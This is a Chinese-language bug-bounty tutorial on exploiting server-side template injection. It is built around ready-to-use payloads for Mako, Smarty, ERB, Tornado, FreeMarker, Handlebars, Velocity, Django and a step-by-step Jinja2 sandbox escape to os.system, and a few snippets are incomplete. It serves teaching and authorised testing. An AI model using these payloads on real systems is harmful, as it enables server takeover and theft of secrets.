# 利用服务器端模板注入漏洞

在本节中，我们将更深入地研究一些典型的服务器端模板注入漏洞，并演示如何使用我们的方法论来利用它们。通过将此过程付诸实践，您可以潜在地发现并利用各种不同的服务器端模板注入漏洞。

一旦您发现服务器端模板注入漏洞，并识别出所使用的模板引擎，成功的利用通常涉及以下过程：

- [阅读](#阅读)
  - [学习基本的模板语法](#学习基本的模板语法)
  - [阅读安全相关文档](#阅读安全相关文档)
  - [寻找已知的利用方式](#寻找已知的利用方式)
- [探索环境](#探索环境)
- [创建自定义攻击](#创建自定义攻击)

## 阅读

除非您已经对模板引擎了如指掌，否则阅读其文档通常是第一步。虽然这可能不是最令人兴奋的消磨时间的方式，但重要的是不要低估文档作为有用信息来源的价值。

关键的兴趣领域是：

- **面向模板作者** ，涵盖了基本语法的快速示例。
- **安全注意事项** ，正在测试的应用程序的开发人员很可能没有阅读过这一部分，它可能包含一些有用的提示。
- 内置方法、函数、过滤器和变量的列表，尤其是调试符号与全局环境变量。
- 扩展/插件列表，有些可能默认启用。

### 学习基本的模板语法

学习基本语法显然很重要，以及关键函数和变量的处理方式。即使是像学习如何在模板中嵌入原生代码块这样简单的事情，有时也能迅速引向一个漏洞利用。例如，一旦您知道正在使用基于 Python 的 Mako 模板引擎，实现远程代码执行可能就如下所示：

```mako
<%
import os
x=os.popen('id').read()
%>
${x}
```

在未沙箱化的环境中，在许多常见的模板引擎中，实现远程代码执行并使用它来读取、编辑或删除任意文件也同样简单。

```smarty
{php}echo `id`;{/php}
```

```erb
<%= system("id") %>
```

```tornado
{{ __import__('os').system('id') }}
```

### 阅读安全相关文档

除了提供如何创建和使用模板的基础知识外，文档还可能提供某种“安全”章节。该章节的名称可能有所不同，但通常会概述人们应该避免使用模板进行的所有潜在危险操作。这可能是一个宝贵的资源，甚至可以充当一个速查表，说明您在审计期间应寻找哪些行为，以及如何利用它们。

即使没有专门的“安全”章节，如果某个特定的内置对象或函数可能构成安全风险，文档中几乎总会有某种警告。警告可能不会提供太多细节，但至少应将此特定内置对象标记为需要调查的内容。

例如，在 ERB 中，文档显示您可以列出所有目录，然后如下读取任意文件：

```erb
<%= Dir.entries('/') %>
<%= File.open('/example/arbitrary-file').read %>
```

```freemarker
// 赋值，获取方法对象
<#assign exec="freemarker.template.utility.Execute"?new()>
// 运算，调用方法
${exec( "/usr/bin/ls" )}
```

### 寻找已知的利用方式

利用服务器端模板注入漏洞的另一个关键方面是善于在线查找额外资源。一旦您能够识别所使用的模板引擎，您应该在网上搜索其他人可能已经发现的任何漏洞。由于某些主要模板引擎的广泛使用，有时可以找到有详细记录的漏洞利用，您可能只需稍作调整即可利用自己的目标网站。

[PayloadsAllTheThings 中 JS 的 handlebars 模板载荷](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md)

```handlebars
// let string = "s"
{{#with "s" as |string|}} 
{{#with "e"}}
    // let conslist = "e".split
    {{#with split as |conslist|}} 
        // conslist.pop
        // 清空当前对象保存的函数
        {{this.pop}} 
        // conslist.push(Function)
        // 查找构造器属性后，覆盖为构造器
        {{this.push (lookup string.sub "constructor")}}
        {{this.pop}}
        // let codelist = string.split
        {{#with string.split as |codelist|}}
            // codelist.pop
            // 清空当前对象中保存的函数
            {{this.pop}}
            // codelist.push("return require('child_process').execSync('ls -la');")
            // 设置代码载荷
            {{this.push "return require('child_process').execSync('ls -la');"}}
            {{this.pop}}
            // each [Function]
            // 设置当前作用域上下文为构造函数
            {{#each conslist}}
                // Function.prototype.apply()
                // MDN 文档中 apply 方法的参数1可任意设置 `this`，而解除调用源的限制
                // 然而此处（除 null 外）任意修改参数1均可成功执行载荷，即参数1似乎被忽略。
                // 模板与 MDN 对函数功能的描述不同，最终导致 this 使用当前作用域的 Function
                // 括号内执行 Function("return require('child_process').execSync('ls -la');")
                // 执行结果作为 with 语句上下文
                {{#with (string.sub.apply 1337 codelist)}}
                    // 输出执行结果，若仅执行代码则此处可省略
                    {{this}}
                {{/with}}
            {{/each}}
        {{/with}}
    {{/with}}
{{/with}}
{{/with}}
```

## 探索环境

此时，您可能已经通过文档偶然发现了一个可行的漏洞利用。如果没有，下一步是探索环境，并尝试发现您可以访问的所有对象。

许多模板引擎会暴露某种 `self` 或 `environment` 对象，它像一个命名空间，包含模板引擎支持的所有对象、方法和属性。如果存在这样的对象，您可以使用它来生成作用域内对象的列表。例如，在基于 Java 的模板语言中，有时您可以使用以下注入来列出环境中的所有变量：

```java
${T(java.lang.System).getenv()}
```

这可以构成创建一份潜在有趣对象和方法候选清单的基础，以便进一步调查。

如果没有内置的 self 对象，或需暴力破解变量名。研究作者通过爬取 GitHub 获取 PHP 项目中使用的 GET/POST 变量名创建了一个字典，并通过 [SecLists](https://github.com/danielmiessler/SecLists/blob/25d4ac447efb9e50b640649f1a09023e280e5c9c/Discovery/Web-Content/burp-parameter-names.txt) 和 Burp Intruder 的字典集公开发布了它。

开发人员提供的对象特别可能包含敏感信息，并且可能在应用程序内的不同模板之间有所不同，因此理想情况下应对每个不同的模板单独应用此过程。

这可能导致其他类型的安全发现，包括权限提升、应用程序密码、API 密钥、配置和环境变量等信息泄露。

### 开发者提供的对象

需要注意的是，网站将包含模板提供的内置对象和 Web 开发者提供的自定义、特定于站点的对象。您应特别关注这些非标准对象，因为它们特别可能包含敏感信息或可利用的方法。由于这些对象在同一网站内的不同模板之间可能有所不同，请注意，您可能需要在不同模板的上下文中研究对象的行为，然后才能找到利用它的方法。

虽然服务器端模板注入可能导致远程代码执行和完全控制服务器，但在实践中并不总能实现这一点。然而，仅仅因为您排除了远程代码执行的可能性，并不一定意味着没有其他类型的漏洞利用潜力。您仍然可以利用服务器端模板注入漏洞进行其他高严重性的利用，例如文件路径遍历，以获取对敏感数据的访问权限。

```django
{{settings.SECRET_KEY}}
```

## 创建自定义攻击

到目前为止，我们主要关注通过重用已记录的漏洞利用或利用模板引擎中已知漏洞来构建攻击。然而，有时您需要构建自定义漏洞利用。例如，您可能会发现模板引擎在沙箱内执行模板，这可能使得利用变得困难甚至不可能。

在识别出攻击面之后，如果没有明显的漏洞利用方法，您应该继续进行传统的审计技术，逐个审查每个函数是否存在可利用的行为。通过有条不紊地执行此过程，有时您可能能够构建一个复杂的攻击，甚至能够利用更安全的目标。

尝试使用模板注入来触发任意对象创建、任意文件读/写、远程文件包含、信息泄露和权限提升漏洞。

### 使用对象链构建自定义漏洞利用

如上所述，第一步是识别您可以访问的对象和方法。其中一些对象可能会立即引起注意。通过结合您自己的知识和文档中提供的信息，您应该能够整理出一份您想要更深入调查的对象候选清单。

在研究对象的文档时，请特别注意这些对象允许访问哪些方法，以及它们返回哪些对象。通过深入研究文档，您可以发现可以链式组合的对象和方法的组合。将正确的对象和方法链式组合在一起，有时可以让您访问到最初看似遥不可及的危险功能和敏感数据。

例如，在基于 Java 的模板引擎 Velocity 中，您可以访问一个名为 `$class` 的 `ClassTool` 对象。研究文档发现，您可以链式使用 `$class.inspect()` 方法和 `$class.type` 属性来获得对任意对象的引用。在过去，这已被利用来在目标系统上执行 shell 命令，如下所示：

```velocity
$class.inspect("java.lang.Runtime").type.getRuntime().exec("bad-stuff-here")
```

读取目标文件到 ASCII 码：

```freemarker
${product.class.getProtectionDomain().getCodeSource().getLocation().toURI().resolve('文件路径').toURL().openStream().readAllBytes()?join(" ")}
```

### 使用开发者提供的对象构建自定义漏洞利用

某些模板引擎默认在安全、锁定的环境中运行，以尽可能减轻相关风险。虽然这使得利用此类模板进行远程代码执行变得困难，但暴露给模板的开发者创建的对象可以提供另一个攻击面，且这个攻击面往往经受的考验更少。

然而，虽然模板内置对象通常有大量文档，但特定于站点的对象几乎肯定没有任何文档记录。因此，如何利用它们将需要您手动调查网站的行为，以识别攻击面并相应地构建您自己的自定义漏洞利用。

- 尝试使用各种功能并触发异常，揭示对象与属性
- 尝试获取源码以审计



## 示例：通过Python代码搜索系统访问

让我们回到我们的示例应用程序。我们已经知道你可以通过此模板注入漏洞执行Python代码。但如何通过注入Python代码来执行系统命令呢？

```python
from jinja2 import Template

tmpl = Template("<html><h1>The user's name is: " + user_input + "</h1></html>")
print(tmpl.render())
```

通常在Python中，你可以通过`os`模块的`os.system()`函数执行系统命令。例如，以下Python代码将执行Linux系统命令`ls`以显示当前目录的内容：

```python
os.system('ls')
```

然而，如果你将此载荷提交到我们的示例应用程序，你很可能不会得到预期的结果：

```py
{{os.system('ls')}}
```

相反，你可能会遇到应用程序错误：

```log
jinja2.exceptions.UndefinedError: 'os' is undefined
```

这是因为`os`模块在模板环境中不被识别。默认情况下，它不包含像`os`这样的危险模块。通常，你可以使用语法`import MODULE`或`from MODULE import *`，或最后`__import__('MODULE')`来导入Python模块。让我们尝试导入`os`模块：

```py
{{__import__('os').system('ls')}}
```

如果你将此载荷提交到应用程序，你可能会看到返回另一个错误：

```log
jinja2.exceptions.UndefinedError: '__import__' is undefined
```

这是因为你无法在Jinja模板中导入模块。大多数模板引擎将阻止使用危险功能（如`import`）或制作一个白名单，只允许用户在模板内执行某些操作。为了绕过Jinja2的这些限制，你需要利用Python沙箱逃逸技术。

### 使用Python内置函数逃逸沙箱

> [PayloadsAllTheThings 拥有更多精简示例](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2)，此处的详细步骤提供核心概念

其中一种技术涉及使用Python的内置函数。当你被禁止导入某些有用的模块或根本不能导入任何东西时，你需要研究Python默认已导入的函数。许多这些内置函数作为Python的`object`类的一部分集成，这意味着当我们要调用这些函数时，我们可以创建一个对象并将该函数作为该对象的方法调用。

例如，以下载荷包含列出可用Python类的Python代码：

```py
{{[].__class__.__bases__[0].__subclasses__()}}"
```

当你将此载荷提交到模板注入端点时，你应该会看到类似这样的类列表：


为了更好地理解这里发生了什么，让我们稍微分解一下这个载荷：

```python
[].__class__.__bases__[0].__subclasses__()
```

它首先创建一个空列表并调用其`__class__`属性，该属性指向实例所属的类`list`：

```python
[].__class__
```

然后你可以使用`__bases__`属性来指向`list`类的基类：

```python
[].__class__.__bases__
```

此属性将返回`list`类的所有基类的元组（在Python中只是一个有序列表）。基类是当前类构建自的类；`list`有一个名为`object`的基类。接下来，我们需要通过引用元组中的第一项来访问`object`类：

```python
[].__class__.__bases__[0]
```

最后，我们使用`__subclasses__()`来引用该类的所有子类：

```python
[].__class__.__bases__[0].__subclasses__()
```

当我们使用此方法时，`object`类的所有子类都变得可访问！现在，我们只需在这些类中寻找一个可用于命令执行的方法。让我们探索一种可能的代码执行方式。在继续之前，请记住并非每个应用程序的Python环境都具有相同的类。而且，我接下来要讲的载荷可能不适用于所有目标应用程序。

可用于导入模块的`__import__`函数是Python的内置函数之一。但由于Jinja2阻止直接访问它，你将需要通过`builtins`模块访问它。此模块提供对Python所有内置类和函数的直接访问。大多数Python模块都有`__builtins__`作为指向内置模块的属性，因此你可以通过引用`__builtins__`属性来恢复`builtins`模块。

在`[].__class__.__bases__[0].__subclasses__()`中的所有子类中，有一个名为`catch_warnings`的类。这是我们将用来构造利用的子类。要找到`catch_warnings`子类，向模板代码注入一个循环来查找它：

```jinja
① {% for x in [].__class__.__bases__[0].__subclasses__() %}
②   {% if 'catch_warnings' in x.__name__ %}
③     {{ x() }}
    {%endif%}
{%endfor%}
```

此循环遍历`[].__class__.__bases__[0].__subclasses__()`中的所有类①，并找到名称中包含字符串`catch_warnings`的那个②。然后它实例化该类的一个对象③。`catch_warnings`类的对象有一个名为`_module`的属性，指向`warnings`模块。

最后，我们使用对模块的引用来引用`builtins`模块：

```jinja
{% for x in [].__class__.__bases__[0].__subclasses__() %}
  {% if 'catch_warnings' in x.__name__ %}
    {{ x()._module.__builtins__ }}
  {%endif%}
{%endfor%}
```

你应该会看到返回的内置类和函数列表，包括`__import__`函数：

我们现在有了一种访问`import`功能的方法！由于内置类和函数存储在Python字典中，你可以通过引用函数条目在字典中的键来访问`__import__`函数：

```jinja
{% for x in [].__class__.__bases__[0].__subclasses__() %}
```

现在我们可以使用`__import__`函数来导入`os`模块。你可以通过提供模块名称作为参数来使用`__import__`导入模块。在这里，让我们导入`os`模块以便我们可以访问`system()`函数：


```jinja
{% for x in [].__class__.__bases__[0].__subclasses__() %}
  {% if 'catch_warnings' in x.__name__ %}
    {{ x()._module.__builtins__['__import__']('os').system('ls') }}
  {%endif%}
{%endfor%}
```

你应该会看到`ls`命令的结果返回。此命令列出当前目录的内容。你已经实现了命令执行！现在，你应该能够使用此模板注入执行任意系统命令。

### 提交载荷进行测试

出于测试目的，你应该执行不会损害目标系统的代码。证明你已实现命令执行并获得操作系统访问权限的常见方法是在系统上创建一个具有唯一文件名的文件，例如`template_injection_by_YOUR_BUG_BOUNTY_USERNAME.txt`，以便该文件明确是你概念验证的一部分。使用`touch`命令在当前目录中创建具有指定名称的文件：

```jinja
{% for x in [].__class__.__bases__[0].__subclasses__() %}
  {% if 'warning' in x.__name__ %}
    {{ x()._module.__builtins__['__import__']('os').system('touch template_injection_by_vickie.txt') }}
  {%endif%}
```

## 自动化模板注入

为每个目标系统开发漏洞利用可能很耗时。幸运的是，模板通常包含其他人已发现的已知漏洞利用，因此当你发现模板注入漏洞时，自动化利用过程以提高效率是个好主意。

一个为自动化模板注入过程而构建的工具，称为 [tplmap](https://github.com/epinna/tplmap)，可以扫描模板注入、确定正在使用的模板引擎并构造漏洞利用。虽然此工具不支持每个模板引擎，但它应该为你提供最流行引擎的良好起点。

## 找到你的第一个模板注入！

是按照我们本章讨论的步骤找到你的第一个模板注入漏洞的时候了：

1. **识别向应用程序提交用户输入的任何机会**。标记模板注入的候选者以供进一步检查。
2. **通过提交测试载荷来检测模板注入**。你可以使用设计用于诱导错误的载荷，或设计用于被模板引擎评估的引擎特定载荷。
3. **如果找到易受模板注入攻击的端点**，确定正在使用的模板引擎。这将帮助你构建特定于该模板引擎的漏洞利用。
4. **研究目标正在使用的模板引擎和编程语言**以构建漏洞利用。
5. **尝试将漏洞提升为任意命令执行**。
6. **创建一个不会损害目标系统的概念验证**。一个好方法是执行`touch template_injection_by_YOUR_NAME.txt`以创建一个特定的概念验证文件。
